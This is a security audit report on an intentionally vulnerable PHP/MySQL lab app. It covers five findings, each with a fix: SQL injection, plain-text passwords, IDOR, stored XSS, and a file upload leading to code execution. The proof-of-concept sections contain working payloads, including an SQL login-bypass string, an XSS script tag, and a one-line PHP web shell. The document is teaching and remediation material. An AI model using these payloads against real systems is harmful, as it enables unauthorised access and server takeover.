# Security Audit Report — SecurAI Vuln Lab

**Prepared by:** Elham Bidarigh
**Scope:** `vuln-app/` (intentionally vulnerable PHP/MySQL application)
**Methodology:** Manual source review + dynamic testing (OWASP WSTG v4.2)

---

## Executive Summary

Five vulnerabilities were identified. Three are rated **Critical**
(CVSS >= 9.0), two are rated **High**. All five are remediated in
`secure-app/`, with proof-of-concept exploits in `tests/exploit.sh`.

| ID | Finding | OWASP | CVSS | Severity |
|----|---------|-------|------|----------|
| FINDING-001 | SQL Injection in login | A03:2021 | 9.8 | Critical |
| FINDING-002 | Plain-text password storage | A02:2021 | 9.1 | Critical |
| FINDING-003 | IDOR in profile endpoint | A01:2021 | 7.5 | High |
| FINDING-004 | Stored XSS in comments | A03:2021 | 8.2 | High |
| FINDING-005 | Unrestricted file upload leading to RCE | A04:2021 | 9.1 | Critical |

All findings were verified by `tests/exploit.sh`, which runs each PoC
against both apps and asserts:

- Exploit **succeeds** against `vuln-app` (port 8081)
- Exploit **fails** against `secure-app` (port 8082)

---

## FINDING-001 — SQL Injection in Login

**Severity:** Critical — CVSS 9.8
**Endpoint:** `POST /login.php`
**OWASP:** A03:2021 — Injection

### Description

The `username` and `password` fields are concatenated directly into
the SQL query. An attacker can bypass authentication entirely.

### Vulnerable code

    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

### Proof of Concept

    curl -s -X POST http://localhost:8081/login.php \
      -d "username=' OR '1'='1' -- " \
      -d "password=x" -i | grep -i location
    # -> Location: dashboard.php  (authenticated as admin)

### Impact

Full authentication bypass. An attacker gains admin access and can
read, modify, or delete all data in the database.

### Remediation

Prepared statements with bound parameters. See `secure-app/login.php`.

---

## FINDING-002 — Plain-text Password Storage

**Severity:** Critical — CVSS 9.1
**Endpoint:** `POST /register.php`
**OWASP:** A02:2021 — Cryptographic Failures

### Description

Passwords are inserted into the database as-is. A single database leak
exposes every user's password in cleartext.

### Proof of Concept

    SELECT username, password FROM users;
    -- admin | admin123
    -- alice | alice123

### Remediation

Use `password_hash(PASSWORD_BCRYPT)` and `password_verify()`. See
`secure-app/register.php`.

---

## FINDING-003 — IDOR in Profile Endpoint

**Severity:** High — CVSS 7.5
**Endpoint:** `GET /profile.php?id=<n>`
**OWASP:** A01:2021 — Broken Access Control

### Description

`profile.php` trusts the `id` parameter from the URL. Any authenticated
user can read any other user's profile (email, role, bio).

### Proof of Concept

    # Log in as alice (id=2), then:
    curl -b cookies.txt "http://localhost:8081/profile.php?id=1"
    # -> shows admin's email, role, bio

### Remediation

Never trust user-supplied IDs. Use the session only:

    $id = (int)$_SESSION['user_id'];  // ignore $_GET['id']

---

## FINDING-004 — Stored XSS in Comments

**Severity:** High — CVSS 8.2
**Endpoint:** `POST /comment.php` -> rendered on `index.php`
**OWASP:** A03:2021 — Injection (XSS)

### Description

Comment bodies are stored raw and rendered without escaping. A
malicious comment executes in every visitor's browser, allowing
session theft and defacement.

### Proof of Concept

    curl -b cookies.txt -X POST http://localhost:8081/comment.php \
      --data-urlencode 'body=<script>alert(1)</script>'
    # Then open http://localhost:8081/ -> script fires

### Remediation

Escape all output:

    echo htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');

---

## FINDING-005 — Unrestricted File Upload -> RCE

**Severity:** Critical — CVSS 9.1
**Endpoint:** `POST /upload.php`
**OWASP:** A04:2021 — Insecure Design

### Description

Any file type is accepted and stored inside the webroot. An attacker
uploads a `.php` file and executes arbitrary code on the server.

### Proof of Concept

    echo '<?php system($_GET["c"]); ?>' > shell.php
    curl -F "file=@shell.php" http://localhost:8081/upload.php
    curl "http://localhost:8081/uploads/shell.php?c=id"
    # -> uid=33(www-data) gid=33(www-data) ...

### Remediation

1. Validate MIME type AND extension against an allowlist.
2. Rename files to a random UUID.
3. Store outside the webroot, serve via a read-only controller.

---

## Remediation Summary

| Finding | Status | Location |
|---------|--------|----------|
| FINDING-001 | Fixed | `secure-app/login.php` |
| FINDING-002 | Fixed | `secure-app/register.php` |
| FINDING-003 | Fixed | `secure-app/profile.php` |
| FINDING-004 | Fixed | `secure-app/comment.php` + `index.php` |
| FINDING-005 | Fixed | `secure-app/upload.php` |

Every fix is verified by `tests/exploit.sh`.
